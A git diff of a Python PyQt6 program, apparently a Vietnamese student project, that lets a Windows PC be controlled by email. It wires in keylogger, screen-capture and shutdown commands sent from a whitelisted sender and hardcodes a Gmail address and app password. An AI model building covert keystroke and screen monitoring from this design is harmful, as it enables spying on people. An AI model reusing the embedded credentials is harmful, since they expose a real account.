@@ -1,18 +1,11 @@
 import sys, os.path, winshell, win32com.client, ctypes, time
-from services.pc import PC
 from threading import Thread
 
+from services.thread_targets import check_mail_thread
 from services.maill_service import MailService
-
-from services.mac import Mac
-from services.help import Help
-from services.keylogger import KeyLogger
-from services.screen import Screen
-from services.app import AppRunning
-from services.process import Process
 from services.html_generator import HTML_Generator
 from services.request_handle import RequestHandle
-
+from services.keylogger import KeyLogger
 from PyQt6.QtWidgets import (
     QApplication,
     QWidget,
@@ -25,10 +18,11 @@ from PyQt6.QtWidgets import (
 from PyQt6.QtGui import QIcon
 ms = None
 isConnected = False
+
 USERNAME = 'email.labdev@gmail.com'
 PASSWORD = 'twptcpnnaekacqwn'
-class Server(QWidget):
 
+class Server(QWidget):
     def __init__(self):
         super().__init__()
 
@@ -74,7 +68,7 @@ class Server(QWidget):
         if(isConnected == False):
             onRun()
             self.open_button.setText('Stop')
-            self.hide()
+            # self.hide()
         else:
             ms.close()
             self.open_button.setText('Run')
@@ -122,7 +116,7 @@ def scan_maill():
 def onRun():
     global isConnected
     isConnected = connect_mail_service()
-    Thread(target=scan_maill).start()
+    Thread(target=check_mail_thread,args=(ms,8,)).start()
 
 def onStop():
     global isConnected
@@ -148,15 +142,16 @@ def main():
     trayIcon.setContextMenu(menu)
 
     #Lấy whitelist
-    rh = RequestHandle()
-    print(rh.parse_request({'sender':'hoaikhaqn1996@gmail.com','subject':'[G8RC] SYSTEM shutdown'}))
+    # rh = RequestHandle()
+    # print(rh.parse_request({'sender':'hoaikhaqn1996@gmail.com','subject':'[G8RC] SYSTEM shutdown'}))
+
     # Lấy địa chỉ Mac
     # mac = Mac()
     # print(HTML_Generator.html_mail("Lấy địa chỉ Mac",mac.get_mac()['html']))
 
     # Lấy nội dung gõ phím (keylogger)
-    # keylog = KeyLogger(10)
-    # print(HTML_Generator.html_mail("Lấy nội dung gõ phím",keylog.get_key_log()['html']))
+    # keylog = KeyLogger()
+    # print(HTML_Generator.html_mail("Lấy nội dung gõ phím",keylog.get_key_log([5])['html']))
 
     # Chụp màn hình
     # screen = Screen()
